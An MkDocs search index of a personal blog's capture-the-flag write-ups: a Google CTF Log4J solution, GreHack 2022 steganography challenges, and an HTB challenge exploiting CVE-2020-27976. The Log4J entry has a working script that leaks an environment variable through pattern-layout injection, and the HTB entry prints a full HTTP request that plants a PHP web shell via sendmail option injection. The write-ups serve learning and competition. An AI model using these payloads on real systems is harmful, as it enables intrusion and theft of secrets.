{"config":{"lang":["en"],"separator":"[\\s\\-]+"},"docs":[{"title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>","location":""},{"title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>","location":"#commands"},{"title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>","location":"#project-layout"},{"title":"Google CTF - Log4J","text":"","location":"blog/google-ctf-log4j/","tags":["CTF"]},{"title":"Introduction","text":"<p>Last weekend I took part in the Google CTF. I chose to look at the web challenges since this is the category I have the most experience with and I did not have much time. When I discovered the list of challenges LOG4J had the most solved so  that what I decided to check. </p>  <p>The challenge has the following description:</p>  <p>Talk with the most advanced AI.</p>  <p>The challenge is available at: https://log4j-web.2022.ctfcompetition.com</p> <p>The challenge is a simple web app with a title \"Chatbot\" and an input field. Let's do some simple tests:</p>    Input Output     test The command should start with a /.   /test Sorry, you must be a premium member in order to run this command.","location":"blog/google-ctf-log4j/#introduction","tags":["CTF"]},{"title":"Analyzing the source","text":"<p>It would help if we knew what is expected from the user. What I really like about the Google CTF is that they often provide the sources. At the time of the CTF the sources where  downloadable as a .zip attachment, but now you can get the sources on GitHub in the google-ctf repo.</p> <pre><code>@app.route(\"/\", methods=['GET', 'POST'])\ndef start():\n    if request.method == 'POST':\n        text = request.form['text'].split(' ')\n        cmd = ''\n        if len(text) &lt; 1:\n            return ('invalid message', 400)\n        elif len(text) &lt; 2:\n            cmd = text[0]\n            text = ''\n        else:\n            cmd, text = text[0], ' '.join(text[1:])\n        result = chat(cmd, text)\n        return result\n    return render_template('index.html')\n\ndef chat(cmd, text):\n    # run java jar with a 10 second timeout\n    res = subprocess.run(['java', '-jar', '-Dcmd=' + cmd, 'chatbot/target/app-1.0-SNAPSHOT.jar', '--', text], capture_output=True, timeout=10)\n    print(res.stderr.decode('utf8'))\n    return res.stdout.decode('utf-8')\n</code></pre> <pre><code>public class App {\n  public static Logger LOGGER = LogManager.getLogger(App.class);\n  public static void main(String[]args) {\n    String flag = System.getenv(\"FLAG\");\n    if (flag == null || !flag.startsWith(\"CTF\")) {\n        LOGGER.error(\"{}\", \"Contact admin\");\n    }\n\n    LOGGER.info(\"msg: {}\", args);\n    // TODO: implement bot commands\n    String cmd = System.getProperty(\"cmd\");\n    if (cmd.equals(\"help\")) {\n      doHelp();\n      return;\n    }\n    if (!cmd.startsWith(\"/\")) {\n      System.out.println(\"The command should start with a /.\");\n      return;\n    }\n    doCommand(cmd.substring(1), args);\n  }\n\n  private static void doCommand(String cmd, String[] args) {\n    switch(cmd) {\n      case \"help\":\n        doHelp();\n        break;\n      case \"repeat\":\n        System.out.println(args[1]);\n        break;\n      case \"time\":\n        DateTimeFormatter dtf = DateTimeFormatter.ofPattern(\"yyyy/M/d H:m:s\");\n        System.out.println(dtf.format(LocalDateTime.now()));\n        break;\n      case \"wc\":\n        if (args[1].isEmpty()) {\n          System.out.println(0);\n        } else {\n          System.out.println(args[1].split(\" \").length);\n        }\n        break;\n      default:\n        System.out.println(\"Sorry, you must be a premium member in order to run this command.\");\n    }\n  }\n  private static void doHelp() {\n    System.out.println(\"Try some of our free commands below! \\nwc\\ntime\\nrepeat\");\n  }\n}\n</code></pre> <p>Main observations:</p> <ul> <li>The flag is set in an environment variable named <code>FLAG</code></li> <li>log4j is running the latest version (as seen in pom.xml)</li> <li>JNDI lookups are disabled by default and Log4Shell is not exploitable</li> </ul>","location":"blog/google-ctf-log4j/#analyzing-the-source","tags":["CTF"]},{"title":"Running the application","text":"<p>First let's run the application locally using Docker</p> <p>To be able to run it locally I removed everything related to kctf:</p> <pre><code>FROM ubuntu:20.04 as chroot\n\nRUN /usr/sbin/useradd --no-create-home -u 1000 user\n\n# install maven\nRUN apt-get update &amp;&amp; \\\n    apt-get -y --no-install-recommends install maven python3-pip\n\n# copy server code\nCOPY server /home/user\nCOPY start.sh /home/user\nRUN chmod 755 /home/user/templates\n\nRUN pip install -r /home/user/requirements.txt\n\n# copy and create jar of chatbot\nCOPY chatbot /home/user/chatbot\nWORKDIR /home/user/chatbot\nRUN mvn clean package shade:shade\n\nWORKDIR /home/user/\nCMD /bin/bash start.sh\n</code></pre> <pre><code>docker build -t log4j .\ndocker run -p 1337:1337 log4j\n</code></pre> <p>Since most payloads don't start with <code>/</code> the response will have the same size, we can look at responses with a 200 status code but with a different response size:</p>    Input Output     /etc/passwd Sorry, you must be a premium member in order to run this command.   test%}wjisg'/\"&lt;kz88p ERROR Unrecognized format specifier []   test%}wjisg'/\"&lt;kz88p ERROR Empty conversion specifier starting at position 54 in conversion pattern.   testqj2buvf2bc3}}%25z}}$z ERROR Unrecognized format specifier [z]   testqj2buvf2bc3}}%25z}}$z ERROR Unrecognized conversion specifier [z] starting at position 67 in conversion pattern.    <p>As we saw earlier the basic log4j exploit do not appear to work but when using <code>${env:HOSTNAME}</code> we can see the  environment variable being replaced in the logs:</p> <pre><code>09:39:10.346 ERROR com.google.app.App executing dd595caab2fc - Contact admin\n09:39:10.348 INFO  com.google.app.App executing dd595caab2fc - msg: --\n</code></pre> <p>So we need to find a way to exfiltrate the content of <code>${env:FLAG}</code> in blind conditions. When dealing blind injection  there are a few common technics:</p> <ul> <li>Triggering conditional responses</li> <li>Triggering errors</li> <li>Triggering time delays</li> <li>Out-of-band (OAST) techniques</li> </ul> <p>We can probably already exclude OAST techniques since this was what the log4Shell vulnerability was using (jndi lookup).</p> <p>It's time to read about the Pattern Layout.  There are a few interesting conversion patterns, mostly the one accepting a pattern as argument:</p> <ul> <li>date{pattern}</li> <li>encode{pattern}{[HTML|XML|JSON|CRLF]}</li> <li>equals{pattern}{test}{substitution}</li> <li>equalsIgnoreCase{pattern}{test}{substitution}</li> <li>highlight{pattern}{style}</li> <li>variablesNotEmpty{pattern}</li> <li>varsNotEmpty{pattern} </li> <li>replace{pattern}{regex}{substitution}</li> <li>notEmpty{pattern}</li> </ul> <p>Some other conversion patterns might be interesting for triggering time delays since the documentation mention that they  are \"expensive operation and may impact performance\":</p> <ul> <li>class{precision}</li> <li>file</li> <li>location</li> <li>method</li> </ul> <p>My initial idea was to use the env lookup inside a conversion pattern and trigger an error that would reveal the flag in an  error message. I tried with a few conversion pattern but none would reveal the FLAG, so I quickly moved on to other techniques.</p> <p>Two conversion pattern are particularly interesting, <code>equals</code> could be used to trigger conditional responses and <code>replace</code>  for a regular expression denial of service (ReDoS).</p> <p>I tried a simple ReDoS payload and while this did not introduce a time delay at some point a <code>StackOverflowError</code> was triggered  with the following payload:</p> <pre><code>%replace{&lt;@repeat(4000)&gt;a&lt;@/repeat&gt;}{&lt;@urlencode&gt;(a|aa)+&lt;@/urlencode&gt;}{z}\n</code></pre> <p>The error:</p> <pre><code>2022-07-11 11:47:25,336 main ERROR An exception occurred processing Appender Console org.apache.logging.log4j.core.appender.AppenderLoggingException: java.lang.StackOverflowError\n    at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:165)\n    [TRUNCATED]\nCaused by: java.lang.StackOverflowError\n    at java.base/java.util.regex.Pattern$BmpCharProperty.match(Pattern.java:3963)\n</code></pre> <p>With this we have the basics for our exploit except for one thing, we need to be able to test each character of the flag individually. For this we will use the <code>maxLength</code> conversion pattern which truncates the result.</p> <pre><code>%replace{\n  %equals{\n    %maxLen{${env:FLAG}}{3}\n  }{CTF}\n  {&lt;@repeat(9999)&gt;a&lt;@/repeat&gt;}\n}\n{&lt;@urlencode&gt;(a|aa)+&lt;@/urlencode&gt;}\n{x}\n</code></pre> <p>If the flag starts with <code>CTF</code> we get a <code>StackOverflowError</code> error. Using this payload we can iterate over each character.  There were a couple of hiccups though: </p> <ul> <li>I did not find the proper way (if any ?) to test for special characters such as  <code>{</code> and <code>}</code> which are part of the flag. I ended up using <code>replace</code> again with the meta sequence <code>\\W</code> to replace all non-word characters.</li> <li>My solution stopped working at 20 characters. Turns out I needed to read the documentation more carefully: \"If the   length is greater than 20, then the output will contain a trailing ellipsis\"</li> </ul> <p>The dirty script to get the FLAG:</p> <pre><code>import requests\n\nurl = \"https://log4j-web.2022.ctfcompetition.com:443/\"\nheaders = {\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\"}\n\nflag = ''\n\nfor x in range(1, 50):\n    print(x)\n    for c in 'CTF-abcdef01234567890':\n        to_test = (c + \"...\") if x &gt; 20 else c\n        payload = \"%replace{%equals{%maxLen{%replace{${env:FLAG}}{\\W}{-}}{\"+str(x)+\"}}{\"+flag + to_test +\"}{\"+\"a\"*9999+\"}}{(a|aa)+}{substitution}\"\n        data = {\n            \"text\": payload\n        }\n        resp = requests.post(url, headers=headers, data=data)\n        if \"StackOverflowError\" in resp.text:\n            flag = flag+c\n            print(flag)\n            break\n</code></pre> <p>The same script can be used to solve LOG4J2 by replacing the matching string since exception were replaced by <code>Sensitive information detected in output. Censored for security reasons.</code>.</p> <p>For alternative solutions, I recommend reading the writeups from Mario Kahlhofer and  Intrigus' Security Lab.</p>","location":"blog/google-ctf-log4j/#running-the-application","tags":["CTF"]},{"title":"GreHack 2022 - Stegano","text":"<p>A couple of writeups for the stegano challenges of the GreHack CTF 2022.</p>","location":"blog/grehack-2022-stegano/","tags":["GreHack22"]},{"title":"Let\u2019s do Pika Pika","text":"<p>This animal tries to tell us something\u2026</p> <p>Author: Jonathan MAROTTA#9819 / eXraZ</p>  <p></p> <pre><code>\u276f binwalk --dd='.*' Lets-do-Pika-Pika.jpg\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             JPEG image data, JFIF standard 1.01\n68786         0x10CB2         End of Zip archive, footer length: 22\n</code></pre> <pre><code>\u276f file 10CB2\n10CB2: Zip archive data (empty)\n\u276f unzip 10CB2\nArchive:  10CB2\nerror [10CB2]:  missing 11731 bytes in zipfile\n  (attempting to process anyway)\nerror [10CB2]:  attempt to seek before beginning of zipfile\n  (please check that you have transferred or created the zipfile in the\n  appropriate BINARY mode and that you have compiled UnZip properly)\n</code></pre> <p>Let's try using <code>foremost</code>:</p> <pre><code>\u276f foremost Lets-do-Pika-Pika.jpg\n</code></pre> <pre><code>\u276f cat audit.txt\nForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus\nAudit File\n\nForemost started at Sat Nov 19 19:19:11 2022\nInvocation: foremost Lets-do-Pika-Pika.jpg\nOutput directory: /Users/aloha/Documents/github/ctf-notes/grehack22/stegano/Let\u2019s do Pika Pika/output\nConfiguration file: /opt/homebrew/etc/foremost.conf\n------------------------------------------------------------------\nFile: Lets-do-Pika-Pika.jpg\nStart: Sat Nov 19 19:19:11 2022\nLength: Unknown\n\nNum  Name (bs=512)         Size  File Offset     Comment\n\n0:  00000000.jpg          55 KB               0\n1:  00000111.zip          11 KB           57055\nFinish: Sat Nov 19 19:19:11 2022\n\n2 FILES EXTRACTED\n\njpg:= 1\nzip:= 1\n------------------------------------------------------------------\n</code></pre> <pre><code>\u276f unzip 00000111.zip\nArchive:  00000111.zip\n  inflating:\n\u276f ls\n0644 .rw-r--r-- 12Ki aloha staff 15 Oct 14:38 \uf016\n0644 .rw-r--r-- 11Ki aloha staff 19 Nov 19:19 \uf410 00000111.zip\n</code></pre> <pre><code>\u276f file '        '\n        : PNG image data, 1505 x 203, 8-bit/color RGBA, non-interlaced\n\u276f mv '        ' image.png\n\u276f open image.png\n</code></pre> <p>In the image we can see:</p>  <p>GH22{Kn0W_y0Ur_f1L3_5trUcTur3_last_modified:yyyy/mm/ddhh:mm:ss}</p> <p>Almost there .... complete with last modification date and time of PKZip archive</p>  <pre><code>\u276f exiftool 00000111.zip\nExifTool Version Number         : 12.50\nFile Name                       : 00000111.zip\nDirectory                       : .\nFile Size                       : 12 kB\nFile Modification Date/Time     : 2022:11:19 19:19:11+01:00\nFile Access Date/Time           : 2022:11:19 19:20:05+01:00\nFile Inode Change Date/Time     : 2022:11:19 19:27:13+01:00\nFile Permissions                : -rw-r--r--\nFile Type                       : ZIP\nFile Type Extension             : zip\nMIME Type                       : application/zip\nZip Required Version            : 20\nZip Bit Flag                    : 0x0800\nZip Compression                 : Deflated\nZip Modify Date                 : 2022:10:15 14:38:34\nZip CRC                         : 0x193ae126\nZip Compressed Size             : 11603\nZip Uncompressed Size           : 12700\nZip File Name                   :\n</code></pre> <p>FLAG: GH22{Kn0W_y0Ur_f1L3_5trUcTur3_last_modified:2022/10/15_14:38:34}</p>","location":"blog/grehack-2022-stegano/#lets-do-pika-pika","tags":["GreHack22"]},{"title":"Periodic Table","text":"<p></p>  <p>Je ne me souviens plus comment j'ai cach\u00e9 ma cl\u00e9 dans ce fichier, mais je me suis laiss\u00e9 tous les indices n\u00e9cessaires dans cette image ...</p> <p>Author: Jonathan MAROTTA#9819 / eXraZ</p>  <p>Using StegOnline we can extract the flag with the following settings:</p> <ul> <li>Pixel Order: Row</li> <li>Bit Order: MSB</li> <li>Bit Plane Order: G B R</li> <li>Trim Trailing Bits</li> </ul> <p>We deduced the value from the picture, the colors give use the order and the row gives us the bits.</p> <pre><code>GH22{LSB  _h1dd1ng  _c4N_b3_  d0n3_1N_  mult1pL3  _w4ys}..  m.......  .......m  ..m..m..  m..m..m.  .m..m..m  ........  ........  ........ \n</code></pre>","location":"blog/grehack-2022-stegano/#periodic-table","tags":["GreHack22"]},{"title":"HTB Business CTF 2022 - Letter Dispair","text":"<p>A high-profile political individual was a victim of a spear-phishing attack. The email came from a legitimate  government entity in a nation we don't have jurisdiction. However, we have traced the originating mail to a government webserver. Further enumeration revealed an open directory index containing a PHP mailer script we think was used to  send the email. We need access to the server to read the logs and find out the actual perpetrator. Can you help?</p>   <p>In the webroot we can see a mailer.php and a mailer.zip containing the source code. Reviewing the source code does not  reveal any obvious vulnerabilities.</p> <p>Let's think outside the box for a minute. While not that big, the code does not look like it was written specifically for this CTF.</p> <p>There could be two options:</p> <ul> <li>The vulnerability was introduced into existing code to create the challenge</li> <li>The vulnerability was found in a real application</li> </ul> <p>Let's see if we can find the original code. A quick search  on the new GitHub search for <code>$images_dir$html_image</code> reveals the original source.  The vulnerable code comes from the Community Edition of Phoenix a fork of OsCommerce, an e-commerce and  online store-management software program</p> <p>Let's see if there are known vulnerabilities for osCommerce. There is one rated 10/10 that looks like it fits CVE-2020-27976:</p>  <p>osCommerce Phoenix CE before 1.0.5.4 allows OS command injection remotely. Within admin/mail.php, a from POST  parameter can be passed to the application. This affects the PHP mail function, and the sendmail -f option.</p>  <p>Another search on GitHub leads to a POC for CVE-2020-27976 that can be used to upload a webshell that was then used to read the FLAG:</p> <pre><code>POST /mailer.php HTTP/1.1\nHost: 178.62.26.185:30977\nContent-Length: 854\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://178.128.168.214:32106\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary1zAk5EgmTo1AA34o\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://178.128.168.214:32106/mailer.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"from_email\"\n\ntest@localhost -OQueueDirectory=/tmp -X/var/www/html/poc.php\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"from_name\"\n\nMinistry\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"subject\"\n\n&lt;?php echo \"Shell\";system($_GET['cmd']); ?&gt;\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"email_body\"\n\nDear ^emailuser^, ...\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"email_list\"\n\ntest@1cedpwwkwg7n80ci7fainnoib9hz5o.oastify.com\n------WebKitFormBoundary1zAk5EgmTo1AA34o\nContent-Disposition: form-data; name=\"attachment\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundary1zAk5EgmTo1AA34o--\n</code></pre>","location":"blog/htb-business-ctf-2022-letter-dispair/","tags":["CTF"]}]}